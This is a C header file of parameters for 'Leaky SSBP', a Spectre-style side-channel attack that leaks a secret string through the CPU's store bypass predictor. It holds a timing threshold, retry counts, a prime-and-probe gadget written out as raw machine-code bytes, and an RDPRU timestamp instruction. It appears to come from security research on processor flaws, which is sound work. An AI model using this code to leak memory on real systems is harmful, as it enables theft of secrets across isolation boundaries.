/*
 * System adjustable parameters.
 * These parameters relates to the microarchitecture design and CPU frequency.
 */

// SSBP threshold, SSBP predicts as non-aliasing if time <= threshold.
#define TYPE_H_BOUND 190

/*
 * Attack adjustable parameters.
 * These parameters relate to the attack performance, including success rate and leakage speed.
 */

// Secret in the victim space that is to be leaked.
#define SECRET "Leaky SSBP: A noval Spectre-CTL attack!\0"
// Leakage length.
#define LEAK_LEN 39
// Try times for secret leakage.
#define TRY_FOR_LEAK 100
// Try times for collision finding.
#define TRY_FOR_COLLISION 10
// Try size for the prime and probe function.
#define PG_NUM 5

/*
 * Attack fixed parameters.
 * These parameters SHOULD NOT be modified.
 */

/**  Prime and probe function in the machine code format. Assembly code is as follows:
 *      .rep 20
 *              imul $1, %rdi
 *      .endr
 *      movl    %$0, 0x0(%rdi)
 *      mov     0x0(%rsi), %eax
 *      .rep 20
 *              imul $1, %eax
 *      .endr
 *      ret
 **/
#define PRIME_PROBE_FUNC        72, 107, 255, 1, 72, 107, 255, 1, 72, 107, 255, 1,\
                                72, 107, 255, 1, 72, 107, 255, 1, 72, 107, 255, 1,\
                                72, 107, 255, 1, 72, 107, 255, 1, 72, 107, 255, 1,\
                                72, 107, 255, 1, 72, 107, 255, 1, 72, 107, 255, 1,\
                                72, 107, 255, 1, 72, 107, 255, 1, 72, 107, 255, 1,\
                                72, 107, 255, 1, 72, 107, 255, 1, 72, 107, 255, 1,\
                                72, 107, 255, 1, 72, 107, 255, 1, 199, 7, 0, 0, 0, 0,\
                                144, 139, 6, 107, 192, 1, 107, 192, 1, 107, 192, 1,\
                                107, 192, 1, 107, 192, 1, 107, 192, 1, 107, 192, 1,\
                                107, 192, 1, 107, 192, 1, 107, 192, 1, 107, 192, 1,\
                                107, 192, 1, 107, 192, 1, 107, 192, 1, 107, 192, 1,\
                                107, 192, 1, 107, 192, 1, 107, 192, 1, 107, 192, 1,\
                                107, 192, 1, 195
// Page size.
#define PG_SIZE (1 << 12) 
// Size of search space for collision finding.
#define EXE_PAGE_SIZE (PG_NUM * PG_SIZE)
// We use instruction RDPRU to get the timestamp.
#define RDPRU ".byte 0x0f, 0x01, 0xfd"